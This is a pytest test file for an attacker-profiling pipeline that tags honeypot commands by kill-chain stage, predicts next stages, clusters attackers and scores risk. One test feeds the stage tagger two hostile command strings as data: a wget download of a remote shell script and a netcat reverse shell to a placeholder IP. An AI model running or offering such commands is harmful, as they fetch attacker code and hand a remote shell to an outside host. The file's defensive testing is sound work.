"""
Basic sanity tests for the ADAPT-X pipeline.
Run with: pytest tests/
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pandas as pd
import pytest

from adaptx.data_generator import generate_dataset, sessions_to_records
from adaptx.killchain import MarkovStagePredictor, tag_stage, STAGES
from adaptx.features import build_attacker_features
from adaptx.profiling import cluster_attackers
from adaptx.risk import score_attackers
from adaptx.pipeline import run_pipeline


def test_data_generator_produces_sessions():
    sessions = generate_dataset(n_sessions=20, seed=1)
    assert len(sessions) == 20
    assert all(s.events for s in sessions)


def test_tag_stage_known_commands():
    assert tag_stage("whoami") == "recon"
    assert tag_stage("wget http://1.2.3.4/x.sh") == "delivery"
    assert tag_stage("crontab -e") == "installation"
    assert tag_stage("nc -e /bin/sh 1.2.3.4 4444") == "c2"
    assert tag_stage("") == "recon"


def test_markov_predictor_fits_and_predicts():
    seqs = [["recon", "delivery", "exploitation"], ["recon", "exploitation"]]
    predictor = MarkovStagePredictor()
    predictor.fit(seqs)
    preds = predictor.predict_next("recon")
    assert len(preds) >= 1
    assert preds[0][0] in STAGES


def test_feature_extraction_shape():
    sessions = generate_dataset(n_sessions=30, seed=2)
    records = sessions_to_records(sessions)
    df = pd.DataFrame(records)
    df["ts"] = pd.to_datetime(df["ts"])
    feat_df = build_attacker_features(df)
    assert "src_ip" in feat_df.columns
    assert "stage_sequence" in feat_df.columns
    assert len(feat_df) > 0


def test_clustering_assigns_archetypes():
    sessions = generate_dataset(n_sessions=40, seed=3)
    records = sessions_to_records(sessions)
    df = pd.DataFrame(records)
    df["ts"] = pd.to_datetime(df["ts"])
    feat_df = build_attacker_features(df)
    profiled = cluster_attackers(feat_df, n_clusters=3)
    assert "archetype" in profiled.columns
    assert profiled["archetype"].notna().all()


def test_risk_scoring_range():
    sessions = generate_dataset(n_sessions=40, seed=4)
    records = sessions_to_records(sessions)
    df = pd.DataFrame(records)
    df["ts"] = pd.to_datetime(df["ts"])
    feat_df = build_attacker_features(df)
    profiled = cluster_attackers(feat_df, n_clusters=3)
    scored = score_attackers(profiled)
    assert scored["risk_score"].between(0, 100).all()
    assert set(scored["risk_level"].unique()).issubset({"Low", "Medium", "High", "Critical"})


def test_full_pipeline_end_to_end():
    result = run_pipeline(source="synthetic", n_sessions=60, seed=7, n_clusters=3)
    expected_cols = {"src_ip", "archetype", "risk_score", "risk_level",
                      "current_stage", "predicted_next_stage"}
    assert expected_cols.issubset(result.columns)
    assert len(result) > 0
    # Sorted descending by risk
    assert list(result["risk_score"]) == sorted(result["risk_score"], reverse=True)


def test_generator_is_reproducible():
    first = sessions_to_records(generate_dataset(30, seed=42))
    second = sessions_to_records(generate_dataset(30, seed=42))

    assert first == second


def test_attacker_identity_is_consistent():
    sessions = generate_dataset(50, seed=42)

    identities = {}

    for session in sessions:
        identity = (
            session.src_ip,
            session.archetype,
        )

        if session.attacker_id in identities:
            assert identities[session.attacker_id] == identity
        else:
            identities[session.attacker_id] = identity


def test_session_ids_are_unique():
    sessions = generate_dataset(50, seed=42)
    session_ids = [session.session_id for session in sessions]

    assert len(session_ids) == len(set(session_ids))


def test_dataset_has_exact_session_count():
    for count in (1, 10, 50, 150):
        sessions = generate_dataset(count, seed=42)
        assert len(sessions) == count


def test_invalid_session_count():
    with pytest.raises(ValueError):
        generate_dataset(0)


def test_invalid_archetype():
    from adaptx.data_generator import generate_session

    with pytest.raises(ValueError):
        generate_session("unknown")


def test_generated_stages_respect_archetype_limits():
    from adaptx.data_generator import (
        ARCHETYPE_CONFIG,
        STAGES,
        generate_dataset,
    )

    sessions = generate_dataset(300, seed=42)

    stage_indices = {
        stage: index
        for index, stage in enumerate(STAGES)
    }

    for session in sessions:
        max_stage = ARCHETYPE_CONFIG[session.archetype]["max_stage"]

        for event in session.events:
            assert stage_indices[event["stage"]] <= max_stage

if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
